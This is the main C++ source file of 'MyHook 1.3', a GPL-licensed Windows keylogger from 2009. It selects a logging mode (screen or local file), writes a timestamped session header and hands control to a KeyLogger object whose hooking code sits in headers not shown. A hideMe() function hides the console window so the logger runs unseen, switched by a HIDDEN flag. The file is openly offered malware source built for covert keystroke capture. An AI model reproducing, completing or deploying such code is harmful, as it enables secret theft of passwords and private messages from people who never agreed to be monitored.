/**
  * @file myhook.cpp
  * @date July 29, 2009
  * @author Daniel Amodio, Patrick Servello
  *
  * MyHook 1.3
  * Origional Code and Concept Copyright 2008 Daniel Amodio (deige101)
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
  *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  *
  */

/*
    TENATIVE UPDATES

    
    CHANGELOG

*/

#include <cstdlib>
#include <windows.h>
#include <time.h>
#include <string>
#include "LogType.h"
#include "KeyLogger.h"

// Include Log Types
#include "Debug.h"
#include "LocalFile.h"


/**
  * HIDDEN: Variable to determine visible state of application
  *        true:      Hides application
  *        false:     Does not hide application
  *                   (usefull for debug mode)
  */
const bool HIDDEN = false;

/**
  * LOG_MODE: Variable to determine how data will be trapped
  *           (See DataLog class, or respective LogType class)
  *           DEBUG:      Data will be written to the screen
  *                       (it is usefull to make HIDDEN = false)
  *           LOCAL_FILE: Data will be written to a local file
  */
const LogTypeName LOG_MODE = DEBUG;

bool myHookIsRunning();
void hideMe();
void startLog(LogType &newDatalog);

int main (void)
{
    // Make sure process is not already running
    if (myHookIsRunning())
       return EXIT_FAILURE;
    
    // Check if we need to hide the window
    if (HIDDEN)
       hideMe();
       
    // Create DataLog object. Current LogTypes are DEBUG and LOCAL_FILE
    //DataLog datalog(LOG_MODE);
    // explain this later
    LogType *datalog;
    
    switch(LOG_MODE)
    {
        case DEBUG:
              datalog = new Debug();
              break;
        case LOCAL_FILE:
              datalog = new LocalFile();
              break;
        default:
                ;
    }
    
    // Add initial data to the log
    startLog(*datalog);
    
    // Create KeyLogger object, and pass LogType object
    KeyLogger keylog(*datalog);
    
    // Pass control to KeyLoggerObject
    keylog.hookIt();
    
    return EXIT_SUCCESS;
}

/**
  * Method to check whether MyHook is already running
  */
bool myHookIsRunning()
{
     /*
     // get the name of our process
     string proc = Process.GetCurrentProcess().ProcessName;

     // get the list of all processes by that name
     Process[] processes = Process.GetProcessesByName(proc);
     
    // if there is more than one process...
    if (processes.Length > 1)
        return true;
    else
        return false;*/
        
    return false;
}
/**
  * Method to hide the keylogger window
  */
void hideMe(void)
{

     HWND stealth;
     stealth=FindWindowA("ConsoleWindowClass",NULL);
     ShowWindow(stealth,0);
}

/**
  * Method to add a timestamp to the data log
  */
void startLog(LogType &newDatalog)
{
     time_t ltime;
     ltime=time(NULL);
     newDatalog.log("\n\n------------------------------------------------------------------------");
     newDatalog.log("\n\t\t\tMyHook Session\t");
     newDatalog.log(asctime(localtime(&ltime))); // Add timestamp to data log
     newDatalog.log("------------------------------------------------------------------------\n");
}
